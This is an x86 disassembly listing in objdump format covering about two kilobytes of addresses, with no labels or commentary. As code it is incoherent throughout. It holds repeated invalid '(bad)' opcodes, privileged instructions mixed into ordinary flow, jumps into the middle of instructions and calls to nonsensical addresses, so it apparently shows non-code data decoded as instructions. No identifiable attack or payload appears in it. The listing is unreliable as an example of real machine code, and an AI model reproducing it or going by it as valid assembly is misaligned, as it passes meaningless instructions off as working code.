  4322a2:	mov    eax,eax
  4322a4:	loopne 0x43222a
  4322a6:	inc    ebp
  4322a7:	add    BYTE PTR [ebx+0x1451c00],cl
  4322ad:	mov    eax,DWORD PTR [ebp+0x20]
  4322b0:	add    edi,ecx
  4322b2:	add    BYTE PTR [eax],ch
  4322b4:	cmp    edi,0x18
  4322b7:	test   DWORD PTR [ebp+0xf],esi
  4322ba:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  4322c1:	jne    0x4322c5
  4322c3:	call   0xffa21d88
  4322c8:	leave  
  4322c9:	rcr    BYTE PTR [esp+eax*4],0x55
  4322cd:	add    ah,ch
  4322cf:	add    BYTE PTR [edi-0x48fef979],dh
  4322d5:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  4322dc:	inc    esp
  4322dd:	mov    ebx,DWORD PTR [eax]
  4322df:	fcom   st(2)
  4322e1:	add    BYTE PTR [edi],bl
  4322e3:	lea    ecx,[eax-0x18]
  4322e6:	(bad)  
  4322e7:	push   DWORD PTR [ecx]
  4322e9:	call   0xffb5704b
  4322ee:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  4322f2:	fstp   DWORD PTR [esi+ebx*8]
  4322f5:	push   ebp
  4322f6:	pop    ebp
  4322f7:	mov    esi,DWORD PTR [edx-0x38]
  4322fa:	add    DWORD PTR [eax],0x28
  4322fd:	mov    edi,DWORD PTR [ebx]
  4322ff:	xor    esi,DWORD PTR [edx+0x3]
  432302:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  432306:	pop    ebp
  432307:	or     al,0x4
  432309:	inc    ecx
  43230a:	push   ebp
  43230b:	(bad)  
  43230c:	in     al,dx
  43230d:	or     ah,ch
  43230f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432310:	xbegin 0xffc89906
  432316:	clc    
  432317:	adc    al,0x45
  432319:	div    BYTE PTR [edx]
  43231b:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  432322:	test   DWORD PTR [ebx+0x666300f8],ebx
  432328:	add    BYTE PTR [ecx+0x66],dh
  43232b:	add    eax,DWORD PTR [ebp+0x52]
  43232e:	adc    eax,0xffffffa0
  432331:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  432337:	test   DWORD PTR [eax],eax
  432339:	clc    
  43233a:	data16 or al,BYTE PTR [ebp+0x45]
  43233e:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  432345:	rol    BYTE PTR [ebp+0x45],1
  432348:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  43234e:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  432354:	push   ebx
  432355:	add    BYTE PTR [eax+eax*1+0x51],dl
  432359:	jge    0x43238e
  43235b:	add    BYTE PTR [esi+0x4],dl
  43235e:	jne    0x4323c5
  432360:	mov    edx,0x457200
  432365:	jmp    0x432329
  432367:	xor    edi,DWORD PTR [ebx]
  432369:	pop    edi
  43236a:	cvtdq2ps xmm7,xmm0
  43236d:	ret    0x0
  432370:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  432376:	xor    ecx,DWORD PTR [edi]
  432378:	add    eax,DWORD PTR [ecx+0x3b]
  43237b:	push   ebx
  43237c:	rdpmc  
  43237e:	out    0x8d,al
  432380:	add    BYTE PTR [eax],cl
  432382:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  432388:	ret    0x450c
  43238b:	sbb    al,0x8b
  43238d:	cmp    eax,esi
  43238f:	or     cl,al
  432391:	or     al,0xc2
  432393:	pop    eax
  432394:	inc    ebp
  432395:	add    ecx,DWORD PTR [edi]
  432397:	add    esi,DWORD PTR [ebp+0x39]
  43239a:	invd   
  43239c:	jge    0x4323a8
  43239e:	mov    eax,0x478ac0
  4323a3:	cli    
  4323a4:	xor    esp,ecx
  4323a6:	mov    ebx,0x5b8ac0
  4323ab:	ret    0x33
  4323ae:	mov    eax,0x833b8b
  4323b3:	sub    BYTE PTR [ebx],al
  4323b5:	inc    ebp
  4323b6:	xor    ax,di
  4323b9:	pushf  
  4323ba:	inc    bh
  4323bc:	mov    esp,esp
  4323be:	hlt    
  4323bf:	test   DWORD PTR [ebp-0x8],esi
  4323c2:	mov    eax,DWORD PTR [ebp-0x14]
  4323c5:	xor    ecx,DWORD PTR [ebx-0x76478864]
  4323cb:	dec    edi
  4323cc:	or     BYTE PTR [eax],al
  4323ce:	jne    0x432359
  4323d0:	mov    esi,esp
  4323d2:	call   0x77a9af97
  4323d7:	inc    ebp
  4323d8:	mov    DWORD PTR [eax+0x9b4f0c],edi
  4323de:	add    BYTE PTR [ecx-0x3ffe0717],cl
  4323e4:	add    BYTE PTR [esi+0x7d],ah
  4323e7:	inc    ebp
  4323e8:	mov    bx,WORD PTR [ebp+0x8]
  4323ec:	add    DWORD PTR [ebp+0x54],0x30c008b
  4323f3:	inc    ebp
  4323f4:	mov    bx,di
  4323f7:	lock test BYTE PTR [ecx+0x7000801],bh
  4323fe:	jge    0x4323c1
  432400:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  432406:	cli    
  432407:	xor    bl,bh
  432409:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  43240f:	test   BYTE PTR [eax],cl
  432411:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  432418:	cmp    ebp,eax
  43241a:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  432421:	test   BYTE PTR [ebp+0x1],bh
  432424:	mov    ebx,0x458a00
  432429:	xor    esi,DWORD PTR [ebx]
  43242b:	add    esp,DWORD PTR [esi-0x77]
  43242e:	pop    ebp
  43242f:	loopne 0x432497
  432431:	inc    ebp
  432432:	clc    
  432433:	xor    edi,DWORD PTR [ebx]
  432435:	add    esi,DWORD PTR [edx-0x77]
  432438:	data16 fdivr QWORD PTR [ebp-0x49]
  43243c:	mov    ebx,0xb78afc
  432441:	hlt    
  432442:	xor    edi,DWORD PTR [esi+eiz*2]
  432445:	add    BYTE PTR [ebp+0x66],bl
  432448:	data16 lock clc 
  43244b:	cmp    al,0x3b
  43244d:	add    BYTE PTR [edi+0x66],dh
  432450:	psubq  mm7,QWORD PTR [ebp+0x2]
  432454:	ltr    WORD PTR [ebp+0x66]
  432458:	add    esi,eax
  43245a:	add    di,WORD PTR [ebp+0x2b]
  43245e:	data16 data16 jge 0x4324df
  432462:	mov    ebx,0xe08a8b
  432467:	jge    0x43249c
  432469:	data16 data16 xor al,0x5d
  43246d:	data16 data16 jne 0x432469
  432471:	mov    edi,DWORD PTR [ebx]
  432473:	fdiv   QWORD PTR [edx+0x7d]
  432476:	data16 data16 jge 0x4324ae
  43247a:	mov    ebx,0x758a66
  43247f:	mov    esi,0x667233
  432484:	pop    ebp
  432485:	or     BYTE PTR [esi+0x0],ah
  432488:	clc    
  432489:	mov    edi,DWORD PTR [ebx]
  43248b:	lock ja 0x432419
  43248e:	(bad)  
  432490:	jge    0x432489
  432492:	invd   
  432494:	pop    ebp
  432495:	add    BYTE PTR [ebx],al
  432497:	(bad)  
  432498:	cmp    di,WORD PTR [ebp+0xf]
  43249c:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4324a0:	mov    bx,WORD PTR [ebp-0x10]
  4324a4:	pop    bp
  4324a6:	fbstp  TBYTE PTR [ebx]
  4324a8:	test   DWORD PTR [ebx],eax
  4324aa:	add    BYTE PTR [ebx],bh
  4324ac:	add    BYTE PTR [esi+0x7d],ah
  4324af:	jge    0x43243c
  4324b1:	data16 in al,dx
  4324b3:	pop    ebp
  4324b4:	stc    
  4324b5:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  4324bc:	mov    edi,ebx
  4324be:	in     al,dx
  4324bf:	test   BYTE PTR [ebp+0x0],bh
  4324c2:	mov    eax,DWORD PTR [eax]
  4324c4:	call   0xbd401e54
  4324c9:	cmp    al,0x9b
  4324cb:	add    BYTE PTR [edx],dh
  4324cd:	mov    bx,di
  4324d0:	call   0x8b4ba260
  4324d5:	add    ebp,esp
  4324d7:	mov    bx,di
  4324da:	jnp    0x432502
  4324dc:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  4324e2:	mov    eax,DWORD PTR [eax]
  4324e4:	call   0x7c3eb04f
  4324e9:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  4324ef:	data16 data16 fistp WORD PTR [ebp+0xe]
  4324f4:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  4324fe:	fisttp WORD PTR [ecx-0x7401f77b]
  432504:	(bad)  
  432505:	cld    
  432506:	jne    0x432544
  432508:	xor    eax,DWORD PTR [eax]
  43250a:	mov    esp,DWORD PTR [esi-0x10]
  43250d:	sti    
  43250e:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  432515:	data16 adc bl,bh
  432518:	push   ebp
  432519:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  432520:	mov    WORD PTR [eax],es
  432522:	fwait
  432523:	data16 xor bh,bl
  432526:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  43252c:	mov    esp,DWORD PTR [esi-0x14]
  43252f:	fisttp WORD PTR [ebx-0x3748a9f2]
  432535:	or     al,0x2b
  432537:	mov    bh,0xba
  432539:	hlt    
  43253a:	mov    bh,bl
  43253c:	add    BYTE PTR [ecx-0x7446f3cd],cl
  432542:	dec    esi
  432543:	or     al,0x0
  432545:	mov    edi,DWORD PTR [ebx]
  432547:	or     BYTE PTR [ebp+0x3b],dh
  43254a:	mov    ecx,DWORD PTR [edi]
  43254c:	fdivr  QWORD PTR [ebx-0x7499ff83]
  432552:	xor    al,0xd8
  432554:	pop    bp
  432556:	lock xor esi,DWORD PTR [ebx]
  432559:	lea    esp,[esi+0x1f]
  43255c:	icebp  
  43255d:	jb     0x432563
  43255f:	add    al,al
  432561:	jge    0x43256f
  432563:	mov    eax,eax
  432565:	fsubr  st,st(3)
  432567:	pop    ebp
  432568:	mov    esi,DWORD PTR [ebx]
  43256a:	in     al,0x8d
  43256c:	rcr    DWORD PTR [edi],0xc2
  43256f:	jb     0x4325cf
  432571:	add    cl,cl
  432573:	jge    0x432581
  432575:	mov    edx,DWORD PTR [ebp-0x20]
  432578:	in     al,dx
  432579:	pop    ebp
  43257a:	data16 data16 or BYTE PTR [esi+edi*4],bh
  43257f:	cmp    di,WORD PTR [ebp+0x0]
  432583:	mov    ebp,DWORD PTR [ebx]
  432585:	fdivr  QWORD PTR [esi+0x668a5d]
  43258b:	cmp    al,0x33
  43258d:	mov    si,0x4e7d
  432591:	mov    eax,DWORD PTR [eax]
  432593:	lock inc ebp
  432595:	mov    esi,DWORD PTR [eax]
  432597:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  43259e:	clc    
  43259f:	(bad)  
  4325a0:	cmp    edi,DWORD PTR [ebx]
  4325a2:	je     0x4325b3
  4325a4:	push   ebx
  4325a5:	loopne 0x4325b6
  4325a7:	dec    ecx
  4325a9:	mov    esp,DWORD PTR [ebp-0x1c]
  4325ac:	int    0xf1
  4325ae:	mov    esi,0x703084d
  4325b3:	pcmpgtd mm6,mm1
  4325b6:	add    BYTE PTR [ebp+0x66],dh
  4325b9:	jmp    0x432586
  4325bb:	mov    eax,DWORD PTR [ebx]
  4325bd:	lock push ebp
  4325bf:	ror    DWORD PTR [ebp-0x2972feb3],1
  4325c5:	or     bh,dl
  4325c7:	jb     0x4325c7
  4325c9:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4325cf:	loopne 0x4325d1
  4325d1:	jne    0x4325d5
  4325d3:	data16 add BYTE PTR [esi+eiz*2],dh
  4325d7:	mov    ecx,ebx
  4325d9:	data16 cmp al,0xf1
  4325dc:	add    BYTE PTR [esi+eiz*2],bh
  4325df:	add    bl,cl
  4325e1:	retw   0xf2
  4325e5:	ret    0x66
  4325e8:	retf   
  4325e9:	enterw 0x4df1,0x19
  4325ee:	pop    edi
  4325ef:	jne    0x432572
  4325f1:	mov    esi,DWORD PTR [eax]
  4325f3:	call   0x77b7b194
  4325f8:	xor    ebp,DWORD PTR [ebx]
  4325fa:	lea    esp,[esi+0x48]
  4325fd:	repnz in eax,0x3b
  432600:	add    BYTE PTR [ebp-0x37],dh
  432603:	xor    edx,DWORD PTR [ebp-0x15]
  432606:	in     al,dx
  432607:	xor    edx,DWORD PTR [esi+0x40]
  43260a:	mov    DWORD PTR [edi],0x338545fc
  432610:	clc    
  432611:	add    esi,DWORD PTR [ecx]
  432613:	pop    edi
  432614:	pushf  
  432615:	pop    ebx
  432616:	call   0xff4425dd
  43261b:	mov    edi,eax
  43261d:	push   ecx
  43261e:	pop    es
  43261f:	mov    edi,DWORD PTR [eax]
  432621:	push   esi
  432622:	inc    esi
  432623:	add    bh,BYTE PTR [esi+0x0]
  432626:	popa   
  432627:	data16 (bad) 
  432629:	into   
  43262a:	gs cmp al,0xcd
  43262d:	add    BYTE PTR [ecx+0x7ce0866],bh
  432633:	ret    0x66
  432636:	add    bh,al
  432638:	add    bh,ah
  43263a:	add    BYTE PTR [ebp+0x31c3f866],al
  432640:	cmp    al,0x9c
  432642:	add    BYTE PTR [esi+0x66],ah
  432645:	into   
  432646:	ret    
  432647:	pop    ebp
  432648:	adc    BYTE PTR [edi+0x0],dl
  43264b:	mov    bh,0x66
  43264d:	mov    edi,0xff038dc3
  432652:	jne    0x4326a8
  432654:	lea    edx,[ecx+0x1]
  432657:	mov    ebx,0xd64ff1
  43265c:	sar    DWORD PTR [ebx],1
  43265e:	test   BYTE PTR [ebp+0x36],dh
  432661:	mov    DWORD PTR [esp+edi*8-0x76],esp
  432665:	push   edi
  432666:	xor    BYTE PTR [ebx],0x38
  432669:	mov    esi,ebx
  43266b:	xor    eax,DWORD PTR [eax-0x3c73819a]
  432671:	ss inc ebp
  432673:	fs pop ebx
  432675:	mov    ebx,0x9c3b30
  43267a:	je     0x4326a7
  43267c:	xor    edi,DWORD PTR [ebx+0x668a33]
  432682:	mov    WORD PTR [ebx],?
  432684:	ss mov ebx,0x8b4e64
  43268a:	pop    edi
  43268b:	cmp    ecx,ecx
  43268d:	jne    0x4326e4
  43268f:	mov    ebp,esp
  432691:	cld    
  432692:	push   esi
  432693:	pop    ebx
  432694:	inc    ebp
  432695:	stc    
  432696:	xor    BYTE PTR [ebp+0x9bef89c],al
  43269c:	test   esi,ecx
  43269e:	clc    
  43269f:	test   dl,dl
  4326a1:	cmp    bh,bh
  4326a3:	fs pop si
  4326a6:	or     bl,al
  4326a8:	add    cl,BYTE PTR [ebx+0x57665100]
  4326ae:	retf   0x3c45
  4326b1:	xor    BYTE PTR [eax],al
  4326b3:	pushf  
  4326b4:	mov    si,0x85ca
  4326b8:	ret    0xf8
  4326bb:	pop    ebx
  4326bc:	dec    dx
  4326bf:	mov    edx,DWORD PTR [edi-0x76]
  4326c2:	push   edi
  4326c3:	add    al,0xb7
  4326c5:	xor    al,0xba
  4326c7:	cmp    al,0x8d
  4326c9:	je     0x4326ca
  4326cb:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  4326cf:	lea    edi,[ebx+0x544fff]
  4326d5:	push   ecx
  4326d6:	cmp    edx,DWORD PTR [ebx+0x75]
  4326d9:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  4326df:	add    BYTE PTR [ebx],dh
  4326e1:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  4326e7:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  4326ee:	mov    ebx,0x3b3b00
  4326f3:	jne    0x432720
  4326f5:	mov    DWORD PTR [ebx+0x728afc],edi
  4326fb:	xor    esi,DWORD PTR [ebx]
  4326fd:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  432703:	push   edi
  432704:	cmp    esp,ebp
  432706:	jne    0x432708
  432708:	sbb    DWORD PTR [eax],0x8085c3fc
  43270e:	clc    
  43270f:	inc    esi
  432710:	pop    ebx
  432711:	sti    
  432712:	add    eax,0xeb8bc075
  432717:	cld    
  432718:	xor    edi,DWORD PTR ds:0xf8c3855e
  43271e:	mov    ecx,DWORD PTR [ecx+edx*2]
  432721:	rol    DWORD PTR [ebp-0x37],0xf
  432725:	mov    DWORD PTR [eax],ecx
  432727:	inc    edi
  432728:	(bad)  
  432729:	in     eax,0xfe
  43272b:	add    bh,bh
  43272d:	(bad)  
  43272e:	mov    esi,0xc38a5e
  432733:	mov    esi,DWORD PTR [ebx]
  432735:	push   ecx
  432736:	mov    edi,0xfc4ec7
  43273b:	test   DWORD PTR [ebp-0x8],edx
  43273e:	xor    di,ax
  432741:	pushf  
  432742:	sub    ebp,eax
  432744:	inc    ebp
  432745:	(bad)  
  432746:	sub    edi,edi
  432748:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  43274e:	inc    ebp
  43274f:	add    BYTE PTR [esi+0x2b],ah
  432752:	or     bh,BYTE PTR [edx+0xf8ac2]
  432758:	cmp    al,0x33
  43275a:	mov    edi,DWORD PTR [edx+0xfe4e81]
  432760:	(bad)  
  432761:	cmp    esi,DWORD PTR [ebx]
  432763:	je     0x43271d
  432765:	push   ebx
  432766:	dec    esi
  432767:	str    ecx
  43276a:	cmp    esp,DWORD PTR [ebp+0x75]
  43276d:	int    0x33
  43276f:	mov    edi,0x789085f
  432774:	mov    edx,DWORD PTR [eax]
  432776:	cld    
  432777:	add    cl,cl
  432779:	data16 add al,0xcb
  43277c:	push   ebp
  43277d:	add    ebp,esp
  43277f:	jne    0x43276d
  432781:	(bad)  
  432782:	mov    DWORD PTR [ecx],0xd685f7ec
  432788:	clc    
  432789:	xlat   BYTE PTR ds:[ebx]
  43278a:	inc    ebp
  43278b:	mov    esi,DWORD PTR [edx]
  43278d:	push   eax
  43278e:	pushf  
  43278f:	in     eax,0x8b
  432791:	add    ah,ch
  432793:	add    dl,BYTE PTR [eax+eax*1+0x51]
  432797:	add    ax,0x72cb
  43279b:	cmp    al,0x0
  43279d:	add    BYTE PTR [ebp+0x66],al
  4327a0:	(bad)  
  4327a1:	retf   
  4327a2:	lock ret 0x85
  4327a6:	clc    
  4327a7:	inc    bp
  4327a9:	retf   
  4327aa:	cmp    eax,0xc77d9cc8
  4327af:	xor    ah,bh
  4327b1:	pushf  
  4327b2:	test   DWORD PTR [edi-0x8],ebx
  4327b5:	je     0x4327fc
  4327b7:	xor    esi,DWORD PTR ds:0x7020840
  4327bd:	ror    BYTE PTR [ebp-0x37],0x8d
  4327c1:	push   ebp
  4327c2:	add    esp,ebp
  4327c4:	jb     0x432751
  4327c6:	add    BYTE PTR [eax],cl
  4327c8:	dec    ebp
  4327c9:	mov    bh,0x81
  4327cb:	push   esi
  4327cc:	push   esp
  4327cd:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  4327d4:	xor    al,BYTE PTR [eax]
  4327d6:	mov    edx,DWORD PTR [edi+0x10]
  4327d9:	(bad)  
  4327da:	scas   eax,DWORD PTR es:[edi]
  4327db:	ret    0x3b
  4327de:	jns    0x3b4424d1
  4327e4:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  4327e8:	dec    ebp
  4327e9:	or     BYTE PTR [ebx],ch
  4327eb:	ret    0x458b
  4327ee:	lock jmp 0x4327e2
  4327f1:	mov    ecx,DWORD PTR [eax]
  4327f3:	or     BYTE PTR [edi],al
  4327f5:	mov    ecx,eax
  4327f7:	xor    DWORD PTR [edx+0x2],0x0
  4327fb:	mov    bh,0xc1
  4327fd:	adc    BYTE PTR [eax],dh
  4327ff:	iret   
  432800:	inc    ebp
  432801:	mov    DWORD PTR [ebx],0x4dfff8c4
  432807:	inc    BYTE PTR [ebx]
  432809:	ret    0xf8
  43280c:	adc    DWORD PTR [esi+0x10],esp
  43280f:	clc    
  432810:	dec    ecx
  432811:	fisttp WORD PTR [ecx+0x456604c0]
  432817:	add    dh,BYTE PTR ds:0x75e0845
  43281d:	ret    0x4d
  432820:	lea    ecx,[ebx+0x18728301]
  432826:	add    BYTE PTR [ebp+0x45],al
  432829:	xor    ecx,ebp
  43282b:	pushf  
  43282c:	add    bh,al
  43282e:	add    al,ch
  432830:	inc    ebp
  432831:	test   DWORD PTR [ebx-0x3eba0708],ecx
  432837:	xor    eax,0x781084d
  43283c:	push   esp
  43283d:	fwait
  43283e:	push   ecx
  43283f:	xor    al,BYTE PTR [ecx+0x32f89b89]
  432845:	inc    ebp
  432846:	cmp    edi,DWORD PTR [ecx]
  432848:	jbe    0x4327e6
  43284a:	mov    eax,edi
  43284c:	or     ah,dh
  43284e:	inc    ebp
  43284f:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  432855:	xor    ecx,DWORD PTR [ebx-0x74747664]
  43285b:	in     al,dx
  43285c:	hlt    
  43285d:	push   esp
  43285e:	push   esp
  43285f:	push   ecx
  432860:	push   ecx
  432861:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  432867:	fwait
  432868:	fwait
  432869:	xor    dh,BYTE PTR [edx]
  43286b:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  432871:	or     BYTE PTR [ebp+0x7],al
  432874:	mov    eax,ecx
  432876:	clc    
  432877:	jb     0x43283a
  432879:	add    BYTE PTR [ebp+0x55],cl
  43287c:	or     DWORD PTR [edi],0xc251d154
  432882:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  43288c:	mov    edi,eax
  43288e:	or     cl,al
  432890:	inc    ebp
  432891:	dec    ebp
  432892:	mov    eax,DWORD PTR [ecx+0x514d540c]
  432898:	or     WORD PTR [ecx],0x899b
  43289d:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  4328a3:	mov    edx,DWORD PTR [ecx+0x8]
  4328a6:	mov    eax,DWORD PTR [ebp-0x8]
  4328a9:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  4328b0:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4328b6:	inc    ebp
  4328b7:	dec    eax
  4328b8:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  4328be:	add    edx,DWORD PTR [ecx-0x8]
  4328c1:	mov    ecx,DWORD PTR [ecx]
  4328c3:	clc    
  4328c4:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  4328cb:	mov    ecx,ebp
  4328cd:	clc    
  4328ce:	(bad)  
  4328cf:	popf   
  4328d0:	inc    DWORD PTR [eax]
  4328d2:	ret    0x8b
  4328d5:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  4328db:	mov    edi,esp
  4328dd:	hlt    
  4328de:	test   ecx,esi
  4328e0:	clc    
  4328e1:	or     BYTE PTR [ebp+0x7],al
  4328e4:	xor    al,cl
  4328e6:	pushf  
  4328e7:	jb     0x43291c
  4328e9:	add    BYTE PTR [eax-0x3f],al
  4328ec:	inc    eax
  4328ed:	daa    
  4328ee:	inc    ebp
  4328ef:	inc    ebp
  4328f0:	xor    eax,0x7f80803
  4328f5:	dec    ebp
  4328f6:	fwait
  4328f7:	add    esi,DWORD PTR [edx]
  4328f9:	clc    
  4328fa:	cmp    DWORD PTR [ecx],ecx
  4328fc:	or     al,0x8
  4328fe:	add    al,BYTE PTR [ebp+0x2c]
  432901:	xor    eax,0x7350845
  432906:	or     BYTE PTR [ebp+0x7],cl
  432909:	lea    ebx,[ebx-0x748dcdff]
  43290f:	add    BYTE PTR [eax*2-0x74b21438],cl
  432916:	mov    edx,DWORD PTR [eax]
  432918:	cld    
  432919:	dec    ebp
  43291a:	push   esp
  43291b:	sub    edx,DWORD PTR [ecx-0x75]
  43291e:	add    eax,0xf172fc
  432923:	or     BYTE PTR [ebp+0x7],cl
  432926:	add    eax,ecx
  432928:	or     al,0x72
  43292a:	add    DWORD PTR [eax],eax
  43292c:	mov    ebx,0x29c2c1
  432931:	inc    ebp
  432932:	mov    eax,DWORD PTR [ebx]
  432934:	cmp    eax,0x3004d1c
  43293a:	xbegin 0x66c8b534
  432940:	clc    
  432941:	or     BYTE PTR [ebp+0x45],al
  432944:	xor    dh,BYTE PTR ds:0x78b089c
  43294a:	adc    BYTE PTR [ebp+0x45],cl
  43294d:	lea    eax,[ebp+0x33727501]
  432953:	add    cl,ch
  432955:	inc    ebp
  432956:	add    bl,ch
  432958:	add    BYTE PTR [ebx+0x45850845],cl
  43295e:	je     0x4328eb
  432960:	push   ebx
  432961:	or     al,0x85
  432963:	dec    ebp
  432964:	std    
  432965:	mov    bh,bh
  432967:	mov    BYTE PTR [ebp-0x75],al
  43296a:	mov    edi,eax
  43296c:	or     al,0x89
  43296e:	inc    ebp
  43296f:	clc    
  432970:	mov    esp,esp
  432972:	hlt    
  432973:	call   DWORD PTR [edi-0x37]
  432976:	push   esp
  432977:	or     al,0x51
  432979:	push   ebp
  43297a:	xor    ebp,esp
  43297c:	mov    esi,0x457251
  432981:	xor    esi,eax
  432983:	pushf  
  432984:	inc    ebp
  432985:	(bad)  
  432986:	mov    edi,eax
  432988:	or     al,0x85
  43298a:	add    al,bh
  43298c:	inc    eax
  43298e:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  432992:	or     ah,bh
  432994:	inc    eax
  432995:	push   esp
  432996:	jmp    0x4329e9
  432998:	mov    eax,DWORD PTR ds:0xe8720c
  43299e:	mov    DWORD PTR [ebp-0x8],eax
  4329a1:	jne    0x4329e8
  4329a3:	jmp    0x432930
  4329a5:	mov    ebp,DWORD PTR [eax]
  4329a7:	clc    
  4329a8:	retf   0xff54
  4329ab:	push   ecx
  4329ac:	mov    DWORD PTR ds:0x757210,eax
  4329b2:	mov    ecx,DWORD PTR [ebp-0x4]
  4329b5:	sub    esp,DWORD PTR [ebx-0x77]
  4329b8:	dec    DWORD PTR [eax*4-0x74ca8abb]
  4329bf:	or     ah,bh
  4329c1:	pop    es
  4329c2:	ds fwait
  4329c4:	push   DWORD PTR [edx]
  4329c6:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  4329cc:	(bad)  
  4329cd:	mov    bh,bh
  4329cf:	jmp    0x4329bd
  4329d1:	leave  
  4329d2:	jne    0x4329dc
  4329d4:	call   0x30232e
  4329d9:	in     al,dx
  4329da:	dec    ebp
  4329db:	add    dh,BYTE PTR [ebx]
  4329dd:	add    BYTE PTR [ebx],al
  4329df:	inc    ebp
  4329e0:	cmp    esi,DWORD PTR [ecx]
  4329e2:	je     0x432980
  4329e4:	mov    eax,edi
  4329e6:	or     al,0xf0
  4329e8:	add    BYTE PTR [ebp+0x458bf845],al
  4329ee:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  4329f4:	adc    al,0x7
  4329f6:	enter  0x9fc0,0xa5
  4329fa:	rol    BYTE PTR [eax],0x5e
  4329fd:	mov    ecx,ecx
  4329ff:	or     al,0xc
  432a01:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  432a08:	jmp    0x432a09
  432a0a:	push   ebp
  432a0b:	mov    esp,ebp
  432a0d:	cld    
  432a0e:	inc    ebp
  432a0f:	inc    ebp
  432a10:	or     DWORD PTR [ecx+0x457dec10],0x0
  432a17:	push   esi
  432a18:	push   esi
  432a19:	mov    edi,0x7af080f
  432a1e:	add    bh,al
  432a20:	test   DWORD PTR [ebx+0x3a7320f],ebx
  432a26:	add    BYTE PTR [ecx+0x4540100f],cl
  432a2c:	mov    ebp,eax
  432a2e:	mov    ebp,edi
  432a30:	lock call edx
  432a33:	fcom   DWORD PTR [ebp+0x45]
  432a36:	mov    eax,0x148a8b
  432a3b:	push   ecx
  432a3c:	enter  0xc145,0x83
  432a40:	cmp    ecx,DWORD PTR [eax]
  432a42:	add    BYTE PTR [ebp+0x4d],al
  432a45:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  432a4b:	call   0xffa325ba
  432a50:	cmp    eax,DWORD PTR [ebp-0xc]
  432a53:	jmp    DWORD PTR [eax+edx*1-0x4e]
  432a57:	push   ebp
  432a58:	(bad)  
  432a59:	call   0x34285d
  432a5e:	mov    bh,0xdb
  432a60:	cld    
  432a61:	or     BYTE PTR [ebp+0x45],bl
  432a64:	(bad)  
  432a65:	call   0xff7d26f5
  432a6a:	add    al,BYTE PTR [ebp+0x37]
  432a6d:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  432a73:	jne    0x432a75
  432a75:	(bad)  
  432a76:	cmp    edi,esp
  432a78:	jne    0x432aab
  432a7a:	mov    edi,edi
  432a7c:	or     BYTE PTR [ebx-0x307f0b49],cl
  432a82:	pop    ds
  432a83:	into   
  432a84:	je     0x432a47
  432a86:	mov    ebx,DWORD PTR [esi]
  432a88:	or     BYTE PTR [ebp-0x49],al
  432a8b:	mov    esp,DWORD PTR [esi-0x77]
  432a8e:	mov    esi,0x2451f0c
  432a93:	mov    eax,DWORD PTR [eax]
  432a95:	or     al,0x66
  432a97:	sar    bl,0x3b
  432a9a:	xor    esi,DWORD PTR [ebp+0x66]
  432a9d:	xor    ecx,edi
  432a9f:	pop    edi
  432aa0:	adc    bl,BYTE PTR [ebx+0x7e]
  432aa3:	ret    0xff
  432aa6:	cld    
  432aa7:	inc    ebp
  432aa8:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  432aae:	cld    
  432aaf:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  432ab6:	push   0xffffff83
  432ab8:	pop    edi
  432ab9:	or     BYTE PTR [ebp+0x53],dh
  432abc:	xorps  xmm1,xmm2
  432abf:	test   BYTE PTR [eax+eax*1],bh
  432ac2:	add    BYTE PTR [eax],al
  432ac4:	adc    eax,eax
  432ac6:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  432ace:	jmp    DWORD PTR [eax]
  432ad0:	ror    al,0x5e
  432ad3:	inc    ebp
  432ad4:	leave  
  432ad5:	xor    ecx,DWORD PTR [eax]
  432ad7:	and    DWORD PTR [ebx-0x3ec30708],ecx
  432add:	add    ah,al
  432adf:	xor    edi,edi
  432ae1:	xor    DWORD PTR [ebx],0x66003302
